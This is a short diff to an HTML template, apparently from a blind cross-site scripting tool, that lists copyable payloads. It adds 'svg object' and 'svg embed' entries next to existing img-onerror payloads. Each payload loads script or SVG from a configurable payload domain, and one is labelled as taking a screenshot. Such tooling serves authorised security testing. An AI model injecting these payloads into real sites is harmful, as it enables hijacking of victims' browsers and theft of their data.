@@ -44,7 +44,14 @@
                   <input value="'><img src onerror=import('//{{setting[payload-domain]}}/i')>" disabled class="form-control"><br>
 
                   <label class="control-label">Img import with screenshot</label>
-                  <input value="'><img src onerror=import('//{{setting[payload-domain]}}/s')>" disabled class="form-control">
+                  <input value="'><img src onerror=import('//{{setting[payload-domain]}}/s')>" disabled class="form-control"><br>
+
+                  <label class="control-label">svg object</label>
+                  <input value="<object data=//{{setting[payload-domain]}}/xss.svg>" disabled class="form-control"><br>
+
+                  <label class="control-label">svg embed</label>
+                  <input value="<embed src=//{{setting[payload-domain]}}/xss.svg>" disabled class="form-control">
+
                 </div>
               </div>
             </div>
